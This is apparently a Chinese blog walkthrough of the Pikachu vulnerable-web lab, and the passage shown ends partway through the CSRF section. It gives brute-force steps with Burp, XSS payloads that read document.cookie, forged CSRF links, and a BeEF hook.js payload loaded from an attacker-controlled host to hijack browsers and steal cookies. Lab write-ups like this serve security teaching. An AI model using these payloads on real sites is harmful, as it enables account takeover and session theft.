<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="Charmersix"><title>pikachu靶场 | Charmersix&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="/images/logo.png"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/regular.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/solid.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"charmersix.icu",root:"/",language:"en",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!0,init_open:!0},style:{primary_color:"#0066cc",logo:"/images/logo.png",favicon:"/images/logo.png",avatar:"/images/head.jpg",font_size:null,font_family:null,hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"Keep writing and Keep loving.",font_color:null,hitokoto:!0},scroll:{progress_bar:!1,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"obsidian"},side_tools:{},pjax:{enable:!1},lazyload:{enable:!0},comment:{enable:!0,use:"waline",valine:{appid:null,appkey:null,server_urls:null,placeholder:null},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null,proxy:null},twikoo:{env_id:null,region:null,version:"1.6.8"},waline:{server_url:"https://waline-charmersix.vercel.app/",reaction:!0,version:2}},post:{author_label:{enable:!1,auto:!1,custom_label_list:["CTFer"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"left",copyright_info:!1},version:"3.6.1"},KEEP.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},KEEP.language_code_block={copy:"Copy code",copied:"Copied",fold:"Fold code block",folded:"Folded"},KEEP.language_copy_copyright={copy:"Copy copyright info",copied:"Copied",title:"Original article title",author:"Original article author",link:"Original article link"}</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="progress-bar-container"></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="/images/logo.png"> </a><a class="logo-title" href="/">Charmersix&#39;s Blog</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">HOME</a></li><li class="menu-item"><a href="/archives">ARCHIVES</a></li><li class="menu-item"><a href="/tags">TAGS</a></li><li class="menu-item"><a href="/links">LINKS</a></li><li class="menu-item"><a href="/about">ABOUT</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">HOME</a></li><li class="drawer-menu-item flex-center"><a href="/archives">ARCHIVES</a></li><li class="drawer-menu-item flex-center"><a href="/tags">TAGS</a></li><li class="drawer-menu-item flex-center"><a href="/links">LINKS</a></li><li class="drawer-menu-item flex-center"><a href="/about">ABOUT</a></li></ul></div><div class="window-mask"></div></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">pikachu靶场</span></div><div class="article-header"><div class="avatar"><img src="/images/head.jpg"></div><div class="info"><div class="author"><span class="name">Charmersix</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2022-08-28 00:00:00</span> <span class="mobile">2022-08-28 00:00</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-04-09 16:34:15</span> </span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/Web/">Web</a>&nbsp;</li><li>| <a href="/tags/study/">study</a>&nbsp;</li><li>| <a href="/tags/pikachu/">pikachu</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fas fa-file-word"></i>&nbsp;<span>11.4k Words</span> </span><span class="article-min2read article-meta-item"><i class="fas fa-clock"></i>&nbsp;<span>43 Mins</span> </span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><h3 id="靶场安装"><a href="#靶场安装" class="headerlink" title="靶场安装"></a>靶场安装</h3><p>我这里直接本地PHP_study安装了</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211060136199.png" alt="image-20221106013553118"></p><p>这里没什么好说的，第一步就是去配置文件里改一下数据库相关配置<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211060137386.png" alt="image-20221106013736326"></p><p>然后点击<code>安装/初始化</code></p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><blockquote><p>Burte Force（暴力破解）概述</p><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p><p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p><p>1.是否要求用户设置复杂的密码；<br>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；<br>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br>4.是否采用了双因素认证；<br>…等等。<br>千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的!</p><p>你可以通过“BurteForce”对应的测试栏目，来进一步的了解该漏洞。</p><p>从来没有哪个时代的黑客像今天一样热衷于猜解密码 —奥斯特洛夫斯基</p></blockquote><h4 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h4><p>我们抓包,发到<code>intruder</code>,这里我们选择集束炸弹,加进去俩字典,筛选一下长度,然后就发现登陆成功<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211060149924.png" alt="image-20221106014949882"></p><h4 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h4><p>这里我们抓包会发现,验证码是cookie验证,也就是说可以伪造,甚至是同一个验证码可以一直使用,我们就从一个验证码入手爆破<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211060205025.png" alt="image-20221106020526981"></p><h4 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h4><p>先随便填一下看看，发现是js弹窗阻止了你前进的脚步，怎么办呢？</p><p>浏览器有js，bp可没有啊，直接爆破<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072056669.png" alt="image-20221107205605619"></p><h4 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h4><p>经过不断的重发后我们会发现这个token是每请求一次就会随之改变，那么有没有方式捕获到呢</p><p>这个题我们要灵活使用bp进行爆破</p><p>我们发到intruder之后，攻击方式选择pitchfork，然后要进入到选项里</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072307777.png" alt="image-20221107230708710"></p><p>grep - extract 勾选，always勾选<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072309789.png" alt="image-20221107230906757"></p><p>然后添加，这里我比较喜欢用正则，因为只要选中就会自动生成</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072308464.png" alt="image-20221107230823421"></p><p>资源池里一定要有一个单线程的<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072309616.png" alt="image-20221107230947585"></p><p>给密码payload选好字典后，将token的payload改为递归，并且手动输入刚才请求到的第一个token</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072304927.png" alt="image-20221107230425825"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><blockquote><p>XSS（跨站脚本）概述</p><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>1.反射性XSS;<br>2.存储型XSS;<br>3.DOM型XSS;</p><p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p><p>你可以通过“Cross-Site Scripting”对应的测试栏目，来进一步的了解该漏洞。</p></blockquote><h4 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h4><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211091928263.png" alt="image-20221109192831155"></p><p>长度被限制了，看一下源码<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211091929336.png" alt="image-20221109192945295"></p><p>原来20，直接加个0,似乎是没有任何过滤,直接弹就行.</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211132134481.png" alt="image-20221113152746088"></p><h4 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h4><p>这题给了我们一个登录账号密码<code>admin\123456</code>,登录进去以后是一个框,这里好像还是没有任何过滤,但是我们用admin账号登陆了,就可以尝试一下xss拿admin的cookie,这里介绍除了官方平台给的另外两种方法,第一种很简单,用一下多彩互联网上的xss平台,不用自己搭建甚至是不用自己写一些js语句,就会自动钓信息 <a class="link" target="_blank" rel="noopener" href="http://xsscom.com/">http://xsscom.com/<i class="fas fa-external-link-alt"></i></a> 这个平平台很简单,xss语句都给你写好了<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211132134321.png" alt="image-20221113155446190"></p><p>另一种就是在自己的云服务器上写一些php代码就可以详情可以参考这篇<a href="https://charmersix.icu/2022/05/14/ctfshow_xss_wp/">https://charmersix.icu/2022/05/14/ctfshow_xss_wp/</a></p><h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><p>存储型和反射型的区别这里不再赘述，但是payload还是一样的</p><h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><p>打一下我们的经典payload测试一看,过滤写到前端了,太好了,将注释闭合一下就可以了.<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211132158608.png" alt="image-20221113215810583"></p><p>经测试’可以打断我们””的闭合,所以payload<code>&#39;1&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code></p><h4 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h4><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211132233596.png" alt="image-20221113223349495"></p><p>上一题的payload还是可以用的，只是我们要再点一下<code>就让往事都随风,都随风吧</code></p><h4 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h4><p>没有任何回显,源码里也看不见任何东西,我们dirsearch扫一下看看<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211132336684.png" alt="image-20221113233631433"></p><p>拿到一个目录,众所周知pikachu的账号密码是<code>admin/123456</code>当然你也可以装作不知道,再去爆破一下登录后台</p><p>一登录后台我们就可以看到自己在留言板打的xss已经执行了,payload还是原来的经典,这时候就可以钓到admin的cookie了</p><h4 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h4><p>打上我们那串经典的payload,很明显没有执行,那就换一套连招</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142113870.png" alt="image-20221114211351802"></p><p><code>&lt;img src=&#39;x&#39; onerror=&#39;alert(document.cookie)&#39;&gt;</code></p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142116233.png" alt="image-20221114211602170"></p><p>执行成功</p><h4 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h4><p>人生之所有苦短,是因为你的xss学习的还不够好</p><p>这题也是点击才能弹窗的xss,onerror函数已经不能用了,这时可以用onclick<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142133066.png" alt="image-20221114213322996"></p><h4 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h4><p>这里看了别人的payload,使用了一个JavaScript协议payload:<code>javascript:alert(1)</code>,然后又参考了这位大佬的<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/ayuuuuuu/p/13362571.html">JavaScript协议<i class="fas fa-external-link-alt"></i></a><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142357729.png" alt="image-20221114235724665"></p><h4 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h4><p>先来经典payload看一下<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211150002652.png" alt="image-20221115000226614"></p><p>看一下源码会发现输入的东西进入了<code>&lt;script&gt;</code>标签,那我们直接alert就好了,先将’闭合然后把后边的注释一下<code>&#39;;alert(document.cookie)//</code><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211150005336.png" alt="image-20221115000514267"></p><h4 id="前置芝士"><a href="#前置芝士" class="headerlink" title="前置芝士"></a>前置芝士</h4><h5 id="JavaScript协议"><a href="#JavaScript协议" class="headerlink" title="JavaScript协议"></a>JavaScript协议</h5><h6 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h6><p><code>JavaScript</code>通信协议是一个伪协议,用于指定url为JavaScript代码</p><ul><li><p>语法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:someScript</span><br></pre></td></tr></table></figure><p><code>someScript</code>是一个或多个使用<code>;</code>分割的JavaScript语句.</p></li><li><p>实例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javasript:alert(document.cookie)&quot;</span>&gt;</span>JavaScript link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h6 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h6><ul><li><p>返回值会替换当前文档</p><p>对于chrome浏览器来说,如果最后一条JavaScript语句的值为字符串(使用’’,””或`括起来的值),那么该字符串会替换当前文档的内容,作为新文档显示出来</p><p>对于Firefox浏览器来说,如果最后一条浏览器的返回值不是<code>undefined</code>,那么就调用该返回值的<code>toString()</code>方法(如果toString()方法不存在就调用<code>valueOf()</code>方法)得到的结果作为新文档显示出来</p><p>返回值为<code>undefined</code>的几种常见写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">javascript:;</span><br><span class="line">javascript:undefined; <span class="comment">//全局变量undefined的值可能被更改</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//void 将之后的内容当作表达式，然后对该表达式求值，并始终返回undefined，而不管全局变量 undefined 的值是否被改变</span></span><br><span class="line"><span class="comment">// 以下写法等价</span></span><br><span class="line">javascript:<span class="keyword">void</span>(<span class="number">0</span>);</span><br><span class="line">javascript:<span class="keyword">void</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li></ul><h6 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h6><ul><li><p>任何使用url的地方都可以使用该通信协议</p><p>在保留锚元素<code>href</code>属性的同时防止点击锚元素页内/外跳转</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:;</span><br><span class="line">javascript:undefined;</span><br><span class="line">javascript:<span class="keyword">void</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>当作 bookmarklet <a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/ayuuuuuu/p/13368750.html">这里写了个小 Demo<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改书签的 URL 为以下代码, 就可实现分屏功能</span></span><br><span class="line">javascript:<span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;&#x27;</span>+document.title+<span class="string">&#x27;&lt;/title&gt;&lt;/head&gt;&lt;body style=&quot;margin:0;&quot;&gt;&lt;iframe style=&quot;border:none;&quot; width=&quot;50%&quot; height=&quot;100%&quot; src=&#x27;</span>+location.href+<span class="string">&#x27;&gt;&lt;/iframe&gt;&lt;iframe style=&quot;border:none;&quot; width=&quot;50%&quot; height=&quot;100%&quot; src=&#x27;</span>+location.href+<span class="string">&#x27;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>执行 JavaScript 代码 (可以执行xss)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 更改页面背景为绿色 (推荐为锚元素绑定事件来更改页面背景)</span></span><br><span class="line">&lt;a href=<span class="string">&quot;javascript:void(document.body.style.backgroundColor=&#x27;green&#x27;);&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开新页面 (注意需返回 undefined, 否则在火狐浏览器会替换文档)</span></span><br><span class="line">&lt;a href=<span class="string">&quot;javascript:window.open(&#x27;about:blank&#x27;); void(0);&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul><h5 id="beef"><a href="#beef" class="headerlink" title="beef"></a>beef</h5><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><p>这里推荐一个比较好用的xss平台：beef, 这个可以搭在自己的vps上,我也是在自己服务器上起了个docker,这里简单放一下安装步骤</p><p>首先没有docker的要先安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure><p>然后我们search一下</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search beef</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142319109.png" alt="image-20221114231919013"></p><p>然后我们pull这个janes的</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull docker.io/janes/beef</span><br></pre></td></tr></table></figure><p>然后就可以run一下跑起来</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> --<span class="built_in">rm</span> -p 3000:3000 docker.io/janes/beef</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142321556.png" alt="image-20221114232128531"></p><p>这里是没有任何回显的,但是已经跑起来了.不用怀疑,然后我们访问一下<code>http://your_ip:3000/ui/panel</code>登录一下,账号密码都是beef</p><h6 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h6><p>beef官方文档说了一堆p话,我是没看懂,这里抄一下这位<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44940180/article/details/107549067">大佬的<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>beef主要是往网页中插入一段名为hook.js的JavaScript脚本代码,如果浏览器访问有了hook.js(钩子)的页面,就会被hook(钩住),勾连的浏览器会执行初始代码返回一些信息,接着目标主机会每隔一段时间(默认为1s)就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行</p><p>beef服务器本质上就像一个web应用,被分为前后端.前端会轮询后端是否有新的数据需要更新,同时前端也可以向后端发送指示,beef持有者可以通过浏览器来登录beef的后端,来控制前端(用户的浏览器)</p><p>beef一般和xss漏洞结合使用,使目标主机执行带有js的文件,但只能控制一个页面</p></blockquote><h6 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h6><p>经典payload<code>&lt; script src=“http://your_ip/hook.js”&gt;&lt; /script &gt;</code></p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211162329317.png" alt="image-20221116232957243"></p><p>这里有很多比较好玩的功能可以玩一玩这里还是参考那位大佬的</p><blockquote><p><strong>模块命令的使用和模块的作用种类</strong><br>Broser：主要是针对浏览器的一些信息收集或攻击，其下的子选项卡Hooked Domain主要是获取HTTP属性值，比如cookie、表单值等，还可以做写简单的浏览器操作，比如替换href值，弹出警告框，重定向浏览器等。这个选项卡下的有些模块会根据受害者的浏览器来决定是否显示。主要是浏览器通用操作和其他基本信息检测。<br>Chrome extensions：主要是针对谷歌浏览器扩展插件<br>Debug：调试功能<br>Exploits：漏洞利用，主要利用一些已公开的漏洞进行攻击测试<br>Host：针对主机，比如检测主机的浏览器、系统信息、IP地址、安装软件等等<br>IPEC：协议间通信。主要是用来连接、控制受害者浏览器的<br>Metasploit：Beef可通过配置和metasploit平台联合，一旦有受害者出现，可通过信息收集确定是否存在漏洞，进一步方便metasploit攻击测试<br>Misc：杂项。<br>Network：网络扫描<br>Persistence：维护受害者访问<br>Phonegap：手机测试<br>Social engineering：社会工程学攻击</p><p>其中：<br>绿色模块：可以执行且目标不可见<br>红色模块：不适合当前目标<br>橙色模块：可以执行但目标可见<br>灰色模块：未在目标浏览器上测试过</p></blockquote><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><blockquote><p>CSRF(跨站请求伪造)概述</p><p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。<br>这里列举一个场景解释一下，希望能够帮助你理解。<br><strong>场景需求：</strong><br>小黑想要修改大白在购物网站tianxie<a class="link" target="_blank" rel="noopener" href="http://www.xx.com上填写的会员地址./">www.xx.com上填写的会员地址。<i class="fas fa-external-link-alt"></i></a><br><strong>先看下大白是如何修改自己的密码的：</strong><br>登录—修改会员信息，提交请求—修改成功。<br>所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p><p>但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>于是他自己跑到<a href="http://www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：">www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：</a><br>【<a class="link" target="_blank" rel="noopener" href="http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change%E3%80%91">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】<i class="fas fa-external-link-alt"></i></a><br>于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。</p><p><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong><br>1.<a class="link" target="_blank" rel="noopener" href="http://www.xxx.com这个网站在用户修改个人的信息时没有过多的校验,导致这个请求容易被伪造/">www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造<i class="fas fa-external-link-alt"></i></a>;<br>—因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>—因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>—所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p><p>因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p><p>如果你没有读太明白,不要犹豫,请再读一遍啦</p><p>你可以通过“Cross-site request forgery”对应的测试栏目，来进一步的了解该漏洞。</p></blockquote><h4 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h4><p>比较简单,bp能完全解决,都不用自己写poc,burpsuite直接一键生成</p><p>当然,get请求的甚至都不需要bp生成poc,直接改url即可,这里两种方法都说一下吧</p><p>首先我们来抓个包,可以发现get传修改的参数,url里就是所修改的信息,我们copy一下,把内容改成我们想要的</p><p>比方说这里我构造的是这个<code>http://localhost/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=110&amp;add=nba+lakes&amp;email=110%40pikachu.com&amp;submit=submit</code></p><p>然后我们把这个url发给好友kobe,并欺骗他访问一下</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152018424.png" alt="image-20221115201812306"></p><p>可以看到,他的信息就被修改了<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152023892.png" alt="image-20221115202319851"></p><p>第二种还是抓包然后通过bp生成csrf_poc</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152025155.png" alt="image-20221115202504097"></p><p>这里呢右上角可以勾选自动提交的,就是kobe一访问就会自动提交表单修改他的信息<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152026009.png" alt="image-20221115202629955"></p><p>然后直接点浏览器测试,就会生成一个地址,这个地址就很有隐蔽性比如我这里是<code>http://burpsuite/show/2/hd7yrgsw6qmo867vq7h667rlct97o7sh</code></p><p>只要kobe访问它,他就又会被攻击了<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152030068.png" alt="image-20221115203017027"></p><p>声明一下:这里是喜欢kobe才会用他的id,并不是想去攻击kobe,我想pikachu的作者应该也是喜欢kobe</p><h4 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h4><p>这里很明显上述第一种方法是没法用的,但是第二种方法还是可以的,我们再重复一下上述操作很快就可以实现<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152343401.png" alt="image-20221115234320367"></p><h4 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h4><p>这题并没有找到利用方法,我们去翻一下它的源代码<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211161958098.png" 